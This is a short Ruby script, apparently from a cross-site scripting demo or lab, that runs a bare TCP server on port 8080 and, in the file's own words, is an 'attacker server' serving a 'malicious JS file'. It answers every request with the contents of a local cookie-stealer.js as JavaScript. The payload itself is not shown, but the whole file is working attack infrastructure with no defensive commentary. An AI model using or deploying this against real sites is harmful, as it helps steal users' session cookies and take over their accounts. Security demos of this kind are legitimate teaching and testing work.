require 'socket'
require 'rack'

PORT = 8080

server = TCPServer.new PORT

puts "Atacker server with the malicious JS file is online... http://localhost:#{PORT}"

loop do
  session = server.accept
  request = session.gets
  puts request

  js_file = File.open('./cookie-stealer.js')

  puts 'Serving a malicious JS file'

  session.print "HTTP/1.1 200\r\n"
  session.print "Content-Type: text/javascript\r\n"
  session.print "Content-Length: #{js_file.size}\r\n"
  session.print "\r\n"
  session.print js_file.read

  session.close
end
